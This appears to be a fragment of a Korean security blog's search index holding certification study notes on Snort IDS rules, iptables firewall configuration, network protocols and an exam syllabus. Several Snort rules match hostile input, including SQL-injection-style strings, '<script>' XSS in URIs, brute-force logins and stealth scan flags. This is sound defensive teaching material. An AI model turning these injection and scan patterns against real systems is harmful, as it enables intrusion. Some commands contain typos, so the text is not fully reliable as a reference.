캐럿. 다음에 나오는 문자는 문자열의 시작을 의미                   $ : $ 앞의 문자는 문자열의 끝을 의미                   . : 임의의 문자 한 개를 의미함                   [] : 집합 안에 지정한 문자들 중 하나와 일치                                            [a-zA-Z] : 소문자 a-z 사이 + 대문자 A-Z 사이 중 한 문자와 일치                       [0-9] : 0~9 사이의 숫자 중 하나                                                           [^] : 집합 안에 지정한 문자들을 제외한 임의의 문자 중 하나와 일치                                            [^0-9] : 숫자를 제외한 임의의 문자 중 하나와 일치                                                           | : OR, 항목을 묶을 때는 소괄호를 이용                                            (x|y|z) : x or y or z                       (tree|leaf|can) : tree or leaf or can                                                           * : * 앞에 나오는 문자가 0회 이상 나타남을 의미                                            Hs*deo : Hssdeo(O), Hdeo(O), Hsdeo(O), Hssssdeo(O) …. Hudeo(X)                                                           + : + 앞에 나오는 문자가 1회 이상 나타남을 의미                   ? : ? 앞에 나오는 문자가 0회 또는 1회 이상 나타남을 의미                                            x? : x가 존재하거나 존재하지 않음                                                           x{n} : {n} 앞에 오는 문자가 정확히 n 회 나타남                                            Ha{3}deo : Haaadeo                                                           x{n,} : x를 n번 이상 반복함을 의미                                            Ha{3,}deo : Haaadeo(O), Haaaadeo(O), …, Haadeo(X)                                                           x{n,m} : x를 n번 이상 m번 이하 반복함을 의미                                               예시                                    Get 또는 Post 로 시작하는 ‘=’ 나 ‘a=a’ 가 들어간 패킷 찾기                           alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any       (msg:\"[TEST]pcre\";content:\"+or+\";       content:\"%27%3D%27\";nocase;       distance:0;within:20;pcre=\"/^(GET|POST)/\"; sid:100050;)                                                                 + 는 space 를 의미                       %27%3D%27 : a=a                                                                                                           Payload / HTTP 관련 : HTTP 패킷에 대해 전체가 아닌 특정필드에서 패턴을 검사하는 기능 지원                            HTTP 구조 : GET /index.php HTTP/1.1               옵션 : 옵션에 raw 가 붙은 경우 (http_raw_*) 디코딩 없이 검사. (uri, header, cookie)                                    http_method : HTTP 요청 시 method 부분을 검사 (GET)                   http_uri : HTTP URI 부분을 검사 (index.php)                   http_header : HTTP의 Header 부분을 검사 (response/request)                   http_cookie : HTTP의 Cookie 부분을 검사                   http_client_body : HTTP client 의 Body 부분을 검사 (POST 요청에 대한 검사)                   http_stat_code : HTTP 의 Status_code 부분을 검사 (HTTP/1.1 200 OK 의 200 부분)                   http_stat_msg : HTTP 의 Status_msg 부분을 검사 (HTTP/1.1 200 OK 의 OK 부분)                                               예시                                    http_method 테스트 : 클라이언트의 http 요청 라인 중 method 부분을 검사, content 가 GET 인 패킷을 탐지                           alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any       (msg:\"[TEST]http_GET\";content:\"GET\";http_method;sid:1000055;)                                                           http_uri 테스트 : 클라이언트의 http 요청 중 uri 정보를 검사, uri 정보 중 &lt;script&gt; 를 포함하는 패킷을 탐지 (XSS)                           alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any       (msg:\"[TEST]http_uri\";content:\"&lt;script&gt;\";http_uri;nocase;sid:1000063;)                                                                                                           Event Threshold(이벤트 제한) 관련                            용도                                    특정 시간동안 발생되는 이벤트 수를 제한하기 위한 옵션                   과도하게 반복되는 이벤트를 막기 위한 옵션                   threshold:type &lt;limit|threshold|both&gt;, track &lt;by_src|by_dst&gt;, count &lt;c&gt;, secods &lt;s&gt;                                               옵션                                    type                                            --limit : 매 s초 마다 패킷 count 개 발생 시 Action 을 1번 수행 (임계시간)                       --threshold : 매 s초 내에 패킷 count 개 발생 시 마다 Action 을 수행 (패킷양)                       --both : 매 s초 내에 패킷 count 개 발생 시 한번 Action 을 수행 (IP)                                                           track                                            by_src : 출발지 IP 기준                       by_dst : 목적지 IP 기준                                                                                       예시                                    limit 테스트 (임계시간)                           threshold:type limit, track by_dst, count 100, seconds 2                                                                 2초 내에 패킷 100개 : 로그 1개                       2초 내에 패킷 200개 : 로그 1개                       4초 내에 패킷 400개 : 로그 2개                                                           threshold 테스트 (패킷양)                           threshold:type threshold, track by_dst, count 100, seconds 2                                                                 2초 내에 패킷 100개 : 로그 1개                       2초 내에 패킷 200개 : 로그 2개                       4초 내에 패킷 400개 : 로그 4개                                                           both 테스트 (IP)                           threshold:type both, track by_dst, count 100, seconds 2                                                                 2초 내에 패킷 100개 : 로그 1개                       2초 내에 패킷 200개 : 로그 1개                       4초 내에 패킷 400개 : 로그 1개                                                                                                                           Snort 공격 패킷 탐지            FTP root 로그인 시도 탐지                    FTP 서비스는 평문으로 송수신 되기 때문에 계정이 노출될 위험이 있음           Wireshark 등을 통한 FTP 메시지 분석                            USER root\\r\\n 메시지 가 평문으로 전달됨 : 포트 21, User root 메시지 탐지                   alert tcp any any -&gt; 10.10.10.0/24 21   (msg:\"FTP root user access\"; content:\"USER root\"; nocase; sid:1000070;)                                                     alert 액션 : 메시지와 탐지 패킷 로그(pcap(default) 형식)를 남긴다.                                            snort.log.15151.... : wireshark, tcpdump 등으로 확인 가능                       tcpdump -r snort.log.15151....                                                                                                                       Telnet root 로그인 성공 탐지                    Wireshark 등을 통한 Telnet 메시지 분석                            Telnet 클라이언트 로그인 성공 시 서버의 응답 데이터로 login 키워드 와 쉘프롬프트 정보가 평문 전달됨                                    예) 쉘프롬프트 : [root@test~]#                   root 계정은 중요한 계정이므로, telnet, ssh 등으로 직접 로그인이 가능하면 공격 대상이 될 수 있다.                   root 계정에 대한 원격접속은 허용하지 않도록 설정한다.                   텔넷 서버에서부터 응답 데이터를 탐지, content 를 통해 login 문자열이 포함되고, pcre 를 통해 정규표현식 포함                       alert tcp 10.10.10.0/24 23 -&gt; any any   (msg:\"Telnet root login success\"; content:\"login\"; pcre:\"/root@.*#/\"; nocase; sid:1000100;)                                                                                                                       패스워드 크래킹 공격 탐지                    패스워드 크래킹 종류                            Brute Force               Dictionary Attack                                   Telnet 로그인 실 시 응답 Data : Login incorrect           threshold 옵션, by_dst, 5초 동안 1번째 이벤트에만 액션 수행                   alert tcp 10.10.10.0/24 23 -&gt; any any       (msg:\"Telnet login brute force attack\"; content:\"login incorrect\"; nocase;       threshold:type limit, track by_dst, count 1, seconds 5; sid:1000101;)                                                   비정상 패킷 탐지            비정상 패킷 : RFC(Request for Comments) 문서에 정의된 프로토콜 표준 패킷 이외의 패킷                    RFC : 인터넷 관련기술을 구현하는데 필요한 상세절차, 기본 틀 등을 제공하는 공문서와 같은 간행물                            IETF(Internet Engineering Task Force) - 인터넷 국제 표준화 기구 에서 발행한 문서                                   IPS/IDS 에서 제대로 처리하지 못하면 시스템 오류/장애가 발생할 수 있음                       비정상 IP 패킷                    인터넷 구간의 사설 IP : 사설 IP 로 예약된 주소는 WAN 에서 사용할 수 없음                            인터넷 구간에서 사설 IP 가 유입된 경우 조작된 IP임               사설 IP 대역                                    A Class : 10.0.0.0 ~ 10.255.255.255 (10.0.0.0/8)                   B Class : 172.16.0.0 ~ 172.31.255.255 (172.16.0.0/12)                   C Class : 192.168.0.0 ~ 192.168.255.255 (192.168.0.0/16)                                               예시                                    UDP 트래픽 중 사설 IP로 설정되어 있는 비정상 패킷을 탐지                           alert udp 10.0.0.0/8 any -&gt; $HOME_NET any       (msg:\"Private IP(10~) Detect\"; sid:1002100;)            alert udp 172.16.0.0/12 any -&gt; $HOME_NET any       (msg:\"Private IP(172~) Detect\"; sid:1002101;)            alert udp 192.168.0.0/16 any -&gt; $HOME_NET any       (msg:\"Private IP(192~) Detect\"; sid:1002102;)                                                                                                           출발지와 목적지가 동일한 IP : Land Attack                            예시                                    출발지와 목적지가 동일한 IP 인 패킷 탐지                           alert ip any any -&gt; $HOME_NET any       (msg:\"Land Attack(src/dst same IP) Detect\"; sameip; sid:1002300;)                                                           메시지 결과  :                           [1002300] Land Attack(src/dst same IP) Detect       시간값 10.10.11.21 -&gt; 10.10.11.21                                                                                                                       비정상 TCP 패킷                    정상적인 TCP 패킷                            3-Way Handshake : SYN -&gt; SYN_ACK -&gt; ACK (정상적 TCP 연결시 사용)               4-Way Handshake : FIN_ACK -&gt; ACK (정상적 연결 종료시 사용)               RST_ACK (연결을 즉시 종료할 때)               연결 후에는 송수신되는 패킷에 디폴트로 ACK Flag 를 포함 (필요시 PSH, URG 사용)                                   비정상적인 TCP 패킷                            SYN_FIN : 동시에 설정될 수 없는 플래그. 구형의 IDS/IPS, FW 에서는 탐지 못함                                    SYN : 연결 설정                   FIN : 연결 종료                   스캔 도구들이 SYN_FIN 패킷을 많이 사용                   예시                           alert tcp any any -&gt; 10.10.10.0/24 any       (msg:\"SYN_FIN Scan Detect\"; flags:SF; sid:1000340;)                                                                 flags 옵션 연산자 사용 예                                                    flags:SF : 연산자가 없는 경우 (SYN,FIN만 설정된 경우)                           flags:SF+ : + 연산자가 있는 경우 (SYN,FIN은 반드시 포함)                           flags:SF* : * 연산자가 있는 경우 (지정한 flag를 하나 이상 포함)                           flags:!SF : ! 연산자가 있는 경우 (지정한 flag를 포함하지 않음)                                                                                                           메시지 결과                           [1000340]SYN_FIN Scan Detect       시간값 10.10.10.10 80 -&gt; 10.10.10.20 80       *****SF                                                                 패킷의 출발지 포트는 1024 이상이어야 함. (위 예시는 비정상)                                                           SYN_FIN 변형 TCP 패킷 : SIN_FIN 플래그만을 탐지하는 IDS/IPS 를 우회하기 위함                                            SYN,FIN,PSH 또는 SYN,FIN,RST 또는 SYN,FIN,PSH,RST 을 조합하여 사용                           alert tcp any any -&gt; 10.10.10.0/24 any   (msg:\"SYN_FIN + SCAN Detect\"; flags:SF+; sid:1000350;)                                                                                                                                       FIN : FIN_ACK 는 정상적인 연결 종료 패킷, FIN 만 설정되는 경우 비정상 TCP 패킷                                    스텔스 스캐닝 기법 중 하나 : FIN 플래그만 설정된 비정상 TCP 패킷                           alert tcp any any -&gt; 10.10.10.0/24 any       (msg:\"FIN scan detect\"; flags:F; sid:1000360;)                                                                                       NULL : 플래그가 설정되지 않은 비정상 TCP 패킷                                    모든 패킷은 Flag 가 설정되어 있음                   NULL 패킷은 스텔스 스캐닝 기법 중 하나                           alert tcp any any -&gt; 10.10.10.0/24 any       (msg:\"Null scan detect\"; flags:!UAPRSF; sid:1000370;)                                                                                                                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","snort"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-snort/",
        "teaser": null
      },{
        "title": "정보보안 - iptables",
        "excerpt":"iptables     정의            리눅스 상에서 방화벽을 설정하는 도구       패킷 필터링 기능 : 지나가는 패킷의 헤더를 보고 해당 패킷에 대한 허용/차단 (ACCEPT/DROP) 결정       Rule 기반의 패킷 필터링 기능을 제공           기능            상태추적 (Connection Tracking or Stateful Inspection)                    방화벽을 통과하는 모든 패킷에 대한 연결상태를 추적, 메모리에 기록하여 상태추적테이블을 생성           모든 송 수신 패킷을 기록하고 검사           기존 연결을 가장하여 접근할 경우 저장되어 있는 상태목록과 비교하여 허용/차단           이미 연결된 상태의 패킷은 검사하지 않음           Stateful Inspection : 이스라엘 보안업체인 Checkpoint 사 에서 최초로 개발한 방화벽 구조                       NAT 기능                    네트워크 주소 변환                       패킷 레벨에서 로깅       확장 모듈을 이용해 다양한 기능 제공           용어            Table                    Filter Table           NAT Table           Mangle Table                       Chain : 패킷이 이동하는 경로 (3가지 기본 Chain 이 존재-삭제불가)                    Chain Input : 방화벽을 최종 목적지로 하는 체인           Chain Output : 방화벽을 최초 출발지로 정하는 체인           Chain Forward : 방화벽을 통과하는 체인 (방화벽을 별도의 서버로 구성해서 서비스할 때 사용하는 체인)           -&gt; INPUT -&gt; Linux Server -&gt; Output -&gt;           -&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt; FORWARD -&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;                            Linux Server 를 목적지로 삼는 모든 패킷은 Input Chain 통과               Linux Server 에서 생성되어 외부로 보내지는 모든 패킷은 Output Chain 을 통과               Forward Chain 은 현재의 Linux Server 가 목적지가 아닌 패킷이 통과하는 Chain (방화벽을 별도의 서버로 구성)                                               Rule : 패킷 필터링을 하기 위한 Rule                    기본구문 형식                            iptables [테이블] [체인] [룰] [타깃]               대 소문자 구분                                   테이블 설정                            형식 : -t [테이블]               테이블을 명시하지 않으면 기본값으로 Filter Table 이 적용                                   체인(Chain) 설정                            형식 : iptables -[A|I|D] [체인]               -A : append 모드 (해당 체인의 가장 마지막 줄에 룰을 추가)               -I : insert 모드 (해당 체인의 첫 줄에 룰을 추가)                                    행번호 지정시 : -I 체인 n(행번호) (n 행에 롤 추가)                                               -D (delete) : delete 모드                                    -D 체인 룰 : 해당 룰 삭제                   -D 체인 n(행번호) : n행의 룰 삭제                                            iptables -D INPUT 1                                                                                       -P : 해당 체인의 기본 정책을 설정, 변경                                    기본 정책 : 해당 체인의 모든 룰에 매치가 되지 않으면 적용되는 정책                   iptables -P [체인명] [ACCPET|DROP|REJECT|LOG]                                               -R (replace) : 위치 선택 후 정책 교환               -N (new chain) : 새로운 체인을 생성               -Z : 체인의 모든 규칙들의 패킷과 바이트 카운트를 0으로 만듬               -X (delete chain) : 비어있는 체인 제거               -C (check) : 패킷을 테스트                                   룰 설정                            형식 : iptables -A INPUT -s [발신지] --sport [발신지포트] -d [목적지] --dport [목적지포트] -j [정책]               제어 옵션 명령어                                    -s (source) : 패킷의 송신지를 제어, IP 또는 IP 대역을 명시 가능                                            -s 192.168.159.0/24                                                           -d (destination) : 패킷의 수신지를 제어, IP 또는 IP 대역을 명시 가능                   -j (jump) : 방화벽을 지난 후 패킷의 상태를 제어                                            -j [정책] : 룰에 매치될 때 적용할 정책을 지정                       ACCEPT : 허용                       DROP : 해당 패킷을 차단한 후 아무런 응답 메시지를 전송하지 않음                       REJECT : 해당 패킷을 차단한 후 ICMP 에러 메시지로 응답 (불필요한 네트워크 트래픽 발생)                       LOG : 탐지 로그를 남김. 주로 /var/log/message 에 남김                                                           -p (protocol) : 프로토콜을 제어                   -i (inbound interface) : 패킷이 들어오는 네트워크 인터페이스                   -o (outbound interface) : 패킷이 나가는 네트워크 인터페이스                   -f (fragment) : 분절(단편화)된 패킷                   --sport : 송신지 포트 제어 (대역 명시 가능)                                            --sport 1024: : 1024 이상의 포트                       --sport :65535 : 65535 이하의 포트                       --sport 1:1023 : 1 ~ 1023 대역의 포트                                                           --dport : 수신지 포트 제어                   --icmp-type [메시지타입] : ICMP 의 경우 타입과 코드를 이용한 메시지 식별                                            --icmp-type echo-request (ICMP Echo Request 를 의미)                                                                                       예시                                    기본 정책을 ACCPET 로 설정                                            iptables -P INPUT ACCEPT                       iptables -P OUTPUT ACCEPT                       iptables -P FORWARD ACCEPT                       -P (policy) : 미리 만들어진 체인의 정책을 바꾸기                                                           현재 자신의 방화벽 규칙을 보는 명령                                            iptables --list                       iptables -L (list) : 적용되어 있는 정책 목록을 출력                                                           규칙 추가 후에 저장하기                                            service iptables save -&gt; /etc/sysconfig/iptables                                                           현재 iptables 규칙을 초기화 하기                                            iptables -F (flush) : 체인의 모든 규칙을 삭제                       iptables -F INPUT                                                           특정 출발지의 패킷을 모두 차단                                            iptables -A INPUT -s 192.168.0.5 -j DROP                                                           특정 목적지로 가는 패킷이 아니라면 허용                                            iptables -A INPUT -d !192.168.0.10 -j ACCPET                                                           특정 프로토콜, 특정 포트일 경우 허용                                            iptables -A INPUT -p TCP --dport 80 -j ACCEPT                                                           ICMP 의 경우 타입과 코드를 이용한 메시지 식별                                                                                   상태 추적 (Connection Tracking)            상태 유형                    New                            상태추적 테이블에 연결 정보를 가지고 있지 않은 패킷               최초로 들어온 패킷의 상태               예) TCP 의 SYN 패킷                                   ESTABLISHED                            상태추적 테이블에 연결 정보를 가지고 있는 패킷의 상태               연결된 이후에 송수신되는 패킷들의 상태                                   RELATED                            상태추적 테이블에 연관된 연결정보를 가지고 있는 패킷의 상태                                    연관 : 연결 시에 포트의 정보가 서비스 수행중에 새롭게 추가될 수 있는데 이러한 서비스 패킷의 상태를 말함                                            예) FTP 프로토콜 (21/TCP 제어채널 -&gt; 20/TCP 데이터채널)                                                                                                           INVALID                            어떤 상태에도 해당되지 않는 패킷상태               연결된 상태를 알 수 없거나 잘못된 헤더를 가지고 있는 경우                                               프로토콜 상태 유형                    TCP 프로토콜 상태                            방화벽 기준                                    inbound SYN 패킷 : NEW                   outbound SYN + ACK 패킷 : ESTABLISHED                   연결종료 마지막 ACK 패킷이 보이기 전까지 ESTABLISHED 상태                                                                   UDP 프로토콜 상태                            비연결 (Connectionless) 프로토콜 : 연결 상태를 유지하지 않음                                    프로토콜 수준에서 연결상태 정보가 없음                                               최초 inbound : NEW 상태               상태추적 테이블에 UDP 는 inbound 될 때마다 임의의 시간동안 정보를 유지 (ESTABLISHED 상태)                                               룰 설정 예시                    위조된 TCP SYN 패킷을 차단                            상태 추적 테이블 상 NEW 이면서 SYN 플래그로 설정되지 않은 패킷 -&gt; DROP               iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT                                    상태추적 테이블에서 ESTABLISEHD, RELATED 상태의 패킷은 모두 허용                                            이미 허용된 트래픽에 대해서는 룰 검사를 다시 하지 않음 (성능 향상)                                                           -m state : 상태추적기능을 사용하기 위한 옵션 (state 모듈)                   --state : state 옵션                                               iptables -A INPUT -p tcp !--syn -m state --state NEW -j LOG --log-prefix \"[Forged SYN Packet]\"                                    패킷의 상태가 NEW 이면서, SYN 플래그가 설정되지 않은 비정상 패킷을 로그에 남김                   --log-prefix \"접두어\" : 로그에 접두어를 만들어 표시                                               iptables -A INPUT -p tcp !--syn -m state --state NEW -j DROP                                    패킷의 상태가 NEW 이면서, SYN 플래그가 설정되지 않은 비정상 패킷을 차단                                               설정 예시                       iptables -F INPUT       iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT       iptables -A INPUT -p tcp !--syn -m state --state NEW -j LOG --log-prefix \"[Forged SYN Packet]\"       iptables -A INPUT -p tcp !--syn -m state --state NEW -j DROP                                                                   FTP ACTIVE MODE 상태추적 (Passive 모드일 경우 포트 지정을 1024 이상으로 하면 됌)                   iptables -F INPUT        iptables -P INPUT DROP        iptables -P OUTPUT DROP       iptables -A INPUT -m state --state ESTABLISHED -j LOG --log-prefix \"[INPUT ESTABLISHED]\"       iptables -A INPUT -m state --state RELATED -j LOG --log-prefix \"[INPUT RELATED]\"       iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT       iptables -A INPUT -m state --state NEW -p tcp --dport 21 -j LOG --log-prefix \"[FTP INPUT_NEW]\"       iptables -A INPUT -m state --state NEW -p tcp --dport 21 -j ACCEPT       iptables -A OUTPUT -m state --state ESTABLISHED -j LOG --log-prefix \"[OUTPUT ESTABLISHED]\"       iptables -A OUTPUT -m state --state RELATED -j LOG --log-prefix \"[OUTPUT RELATED]\"       iptables -A OUTPUT -m state --state ESTABLISHED, RELATED -j ACCEPT                                                   확장 모듈            connlimit 모듈                    개요                            동일한 ip 대역에 대한 동시 연결 개수 제한 모듈               디도스 공격에 효과적 대응                                   주요옵션                            --connlimit-above n : n을 초과하는 동시 연결을 제한               --connlimit-mask mask : 0~32 범위의 mask 값을 지정, IP 대역에 대한 동시 연결 제한                                   예시                            웹서버 80 포트에 대한 TCP SYN Flooding 공격 대응룰                                    TCP 80포트에 동일 src IP 로 동시연결개수가 5개 초과시 이를 차단                   로그 저장 위치 : /var/log/messages                       iptables -F INPUT   iptables -A INPUT -m state --state ESTABLISHED, RELATED -j ACCEPT   iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 5 -j LOG --log-prefix \"[CONNLIMIT]\"   iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 5 -j DROP                                                                                       웹서버 (80/tcp) 에 대한 TCP SYN Flooding 공격에 대응하기 위한 룰 설정                       iptables -F INPUT       iptables -A INPUT -m state --state ESTABLISHED, RELATED -j ACCEPT       iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 10 --connlimit-mask 24 -j LOG --log-prefix \"[CONNLIMIT]\"       iptables -A                                                                                              limit 모듈                    룰에 매치되는 비율을 제한                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","iptables"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-iptables/",
        "teaser": null
      },{
        "title": "정보보안기사 실기 - 01.네트워크 - 01.프로토콜",
        "excerpt":"프로토콜 (Protocol)     프로토콜의 정의            서로 다른 시스템 및 기기 간 데이터 교환을 원할히 하기 위한 표준화된 통신 규약           프로토콜의 기본 요소            구문(Syntax) : 송수신 데이터 포멧 의미       의미(Semantic) : 데이터의 각 항목이 가지는 의미       타이밍(Timing) : 데이터 송수신 동작방식을 정의하는 것           프로토콜의 특징            단편화(Fragmentation) : 송신 측에서는 긴 데이터 블록을 손쉽게 전송할 수 있도록 크기가 똑같은 작은 블록으로 나누어 전송       재조립(Assembly) : 수신 측에서 쪼개진 작은 데이터 블록을 재합성하여 원래의 메시지로 복원하는 기능       캡슐화(Encapsulation) : 각 프로토콜에 적합한 데이터 블록을 만들려고 데이터에 정보를 추가하는 것       연결 제어(Connection Control) : 비연결 데이터 전송(데이터그램)과 연결 위주 데이터 전송(가상회선)을 위한 통신로를 개설, 유지, 종결하는 기능       오류 제어(Error Control) : 데이터 전송 중 발생할 수 있는 오류나 착오 등을 검출하고 정정하는 기능       동기화(Synchronization) : 두 통신 객체의 상태(시작, 종류, 검사 등)를 일치시키는 기능       다중화(Multiplexing) : 하나의 통신로를 여러 개로 나누거나 회선 여러개를 하나의 통신로로 변환시켜 다수의 가입자가 동시에 사용할 수 있도록 하는 기능       주소지정(Addressing) : 발생지, 목적지 등의 주소를 명기하여 데이터를 정확하게 전달하는 기능       전송 서비스(Transmission Service) : 데이터 전송 중 발생할 수 있는 오류나 착오 등을 검출하고 정정하는 기능           통신 프로토콜     통신 프로토콜의 정의            통신 프로토콜은 컴퓨터나 원거리 통신 장비 사이에서 메시지를 주고 받는 양식의 체계           통신 프로토콜의 종류            TCP(Transmission Control Protocol) : 전송 제어 프로토콜, 전송계층       IP(Internet Protocol) : 송신 호스트와 수신 호스트가 패킷 교환 네트워크에서 정보를 주고받는데 사용하는 정보 프로토콜          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사 실기","네트워크","프로토콜"],
        "url": "https://bluesplatter.com/is_certification/IST-Network-Protocol/",
        "teaser": null
      },{
        "title": "정보보안기사 실기 - 01.네트워크 - 02.OSI7 Layer",
        "excerpt":"OSI7 Layer     OSI Layer            개방시스템(Open System)의 기반 구조와 관계없이 시스템 간의 통신을 제공하는 계층형 프로토콜 집합       7계층                    사용자 계층                            Application               Presentation               Session                                   전송 계층                            Transport                                   네트워크 계층                            Network               Data link               Physical                                                   주요 용어            Node(노드) : 네트워크에 연결된 장치(device)를 의미       HOST(호스트) : 일반적으로 Node(노드) 중 컴퓨터(PC, Server)노드를 가리켜 호스트라고 표현       End-Node(종단 노드) : 통신의 양 끝단에 해당하는 노드로 최초 송신 노드(최초 출발지)와 최종 수신 노드(최종 목적지)       Intermediate Node(중계 노드) : End-Node 사이에 패킷 중계를 해주는 노드       Link(링크) : 노드 사이의 패킷을 전달하기 위한 물리적인 통신경로           OSI7 Layer 의 계층 구조            1계층 (물리 계층, Physical Layer)                    전송을 위해 필요한 물리적 링크의 설정, 유지, 해제를 담당                       2계층 (데이터링크 계층, Data link Layer)                    논리적 연결제어를 담당하는 LLC(Logical Link Control) 또는 DLC(Data Link Control)과 장비와 장비간의 물리적인 접속을 담당하는 MAC(Media Access Control) 의 두개 sub 계층이 존재 - MAC 주소                       3계층 (네트워크 계층, Network Layer)                    논리적 링크를 설정하고 상위 계층 데이터를 작은 크기의 패킷으로 분할하여 전송하는 역할                       4계층 (전송 계층, Transport Layer)       5계층 (세션 계층, Session Layer)       6계층 (표현 계층, Presentation Layer)          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사 실기","네트워크","OSI7 Layer"],
        "url": "https://bluesplatter.com/is_certification/IST-Network-OSI7/",
        "teaser": null
      },{
        "title": "정보보안기사 실기 - 00.시험대비 공부할 목차 정리",
        "excerpt":"-이론편-   PART 01 시스템   SECTION 01 시스템 기본 학습     윈도우 기본 학습            루트 키 (registry)           UNIX/Linux 기본 학습   UNIX/Linux 시스템 관리   UNIX/Linux 서버 보안   시스템 해킹            교착상태       RAID       Run Level       utmp       wtmp       btmp       crontab       at           SECTION 02 UNIX/Linux 서버 취약점     계정 관리            패스워드 파일           파일 및 디렉터리 관리            umask       chmod       setuid       setgid       sticky bit       chown           SECTION 03 윈도우 서버 취약점     계정 관리            winlogon       lsa       sam       srm           서비스 관리            lsass       net share           로그 관리            이벤트 로그       DDE 취약점           PART 02 네트워크   SECTION 04 네트워크 기본 학습     프로토콜(Protocol)   OSI 7Layer            OSI 7Layer           OSI모델 데이터 교환 방식   TCP/IP 프로토콜   ARP/RARP 프로토콜(TCP/IP 인터넷 계층)            ARP Spoofing           IP(IPv4) 프로토콜            MTU       Subnet Mask       IP Spoofing           ICMP 프로토콜            ICMP 메시지 종류           TCP 프로토콜   UDP 프로토콜   네트워크 관리 명령어   포트 스캐닝(Port Scanning)            NMAP Port Scan                 Stealth Scan                    TCP FIN Scan           TCP Null Scan           TCP X-MAS Tree Scan                       TCP Half Open Scan                    TCP SYN Scan                       UDP Scan       - TCP Fragmentation       - 스니핑?           서비스 거부(DoS:Denial of Service) 공격   분산 서비스 거부(DDoS:Distributed Denial of Service) 공격            TCP SYN Flooding       ICMP Flooding / Smurfing Attack       Tear Drop                 Tiny Fragment       Fragment Overlap       IP Fragmentation                    Ping of Death           Tear Drop                            Land Attack               HTTP GET Flooding               Slow HTTP Get/Post Attack               Slow HTTP Read DoS               Slow HTTP Header DoS(Slowloris)               Hash DoS               Hulk DoS                                                   DRDoS(Distributed Reflection DoS)   무선랜(Wireless LAN) 보안            WEP / WPA / WPA2       네트워크 토폴로지 (트리형, 버스형, 성형, 링형, 망형)           SECTION 05 네트워크 보안 프로토콜     가상 사설망(VPN:Virtual Private Network)            가상사설망       SSL VPN       IPSEC VPN       PPTP VPN       L2TP VPN       L2F       망분리           IP 보안 - IPsec(IP Security)            IPSEC Header       IPSEC 키관리           전송 계층 보안 - SSL/TLS            SET       이중서명       SSL Handshake       SSL Header       OTP           SECTION 06 라우터 보안     라우터 자체 보안   라우터와 접근제어(ACL)   라우터를 통한 네트워크 보안            OSPF       RIP           PART 03 어플리케이션   SECTION 07 어플리케이션 기본 학습     DNS(Domain Name System)            DNS Query       DNS 증폭공격       DNSSEC       DNS캐시포이즈닝           HTTP(Hyper Text Transfer Protocol)            Request Header       Response Header           FTP(File Transfer Protocol)            FTP 전송모드(Active/Passive)       FTP / tFTP / sFTP       ftp 접근 통제 파일       FTP 취약점       FTP 로그기록           SNMP(Simple Network Management Protocol)   DHCP(Dynamic Host Configuration Protocol)   SECTION 08 웹 어플리케이션 취약점     SQL Injection 취약점   크로스 사이트 스크립트(XSS:Cross Site Script) 취약점   크로스 사이트 요청 위조(CSRF:Cross Site Request Forgery) 취약점   서버 사이트 요청 위조(SSRF:Server Side Request Forgery) 취약점   운영체제 명령 실행(Command Execution) 취약점   파일 업로드(File Upload) 취약점   파일 다운로드(File Download) 취약점   경로 추적(Path Traversal) 취약점   파일 삽입(File Inclusion) 취약점   URL/파라미터 변조 취약점   불충분한 세션 관리 취약점            Session Hijacking           정보누출 취약점   기타 웹 어플리케이션 취약점   개발 보안 관리   SECTION 09 웹 서버 취약점     디렉터리 리스팅(Directory Listing) 취약점   웹 서비스 메소드 설정 취약점   관리자 페이지 노출 취약점   위치공개 취약점   검색엔진 정보 노출 취약점   기타 웹서버 보안 대책(아파치 기준)   웹 로그 분석   보안서버(Security Server) 구축            APT 공격       httpd.conf       FollowSymLinks       ServerSignature       Server Tokens       접근제어 (httpd.conf)       세션관리           SECTION 10 이메일(E-Mail) 보안     이메일 시스템 구조   SMTP 메일 형식            POP3, IMAP       PGP / PEM / S-MIME           메일서버(sendmail) 보안 설정   이메일 인증 기술(스팸 메일 방지 기술)            RBL       SPF       Spam Assassin           SECTION 11 데이터베이스 보안     데이터베이스 보안 위협과 통제            집합성       추론           DBMS 보안 통제   데이터베이스 암호화 기술            DB 암호화 솔루션       DB 감사 솔루션       DB 백업 (전체, 차등, 증분)           데이터베이스(MySQL) 취약점 점검   SECTION 12 클라우드 컴퓨팅 보안     클라우드 컴퓨팅 개요 및 특징   클라우드 컴퓨팅 분류   클라우드 기반 보안 서비스 : SecaaS   PART 04 침해사고 분석 및 대응   SECTION 13 보안장비 운영     침입탐지 시스템(snort)   침입차단 시스템(iptables)            iptables           보안 솔루션 종류 및 특징            침입차단 시스템                 패킷 필터링       어플리케이션 게이트웨이       회선 게이트웨이       상태 기반 패킷 검사       - 침입차단 시스템 구축 유형       스크리닝 라우터       베스천 호스트       듀얼 홈드 호스트       스크린드 호스트       스크린드 서브넷       - 침입탐지 시스템       오용탐지       이상탐지       NIDS / HIDS       지식기반 탐지 / 행위기반 탐지       - 침입대응 시스템       - UTM       - 허니팟       - NAC       - ESM       - SIEM       - SSO       - DRM       - 워터마킹       - 디지털 포렌식           네트워크 보안장비 운영   보안 솔루션(장비) 취약점   SECTION 14 시스템 점검 도구     취약점(Vulnerability) 점검 도구(nessus/nikto)   무결성(Integrity) 점검 도구(tripwire)   루트킷(Rootkit) 점검 도구(chkrookit)            tripwire           SECTION 15 침해사고 유형별 시나리오     리버스 쉘(Reverse Shell) 침해 사고 시나리오   루트킷(Rootkit) 침해 사고 시나리오   DBD(Drive By Download) 침해 사고 시나리오   악성코드 행위 분석 시나리오   워터링 홀(Watering Hole) 침해 사고 시나리오   SECTION 16 주요 취약점(Vulnerability)     GNU Bash 취약점(ShellShock)            ShellShock           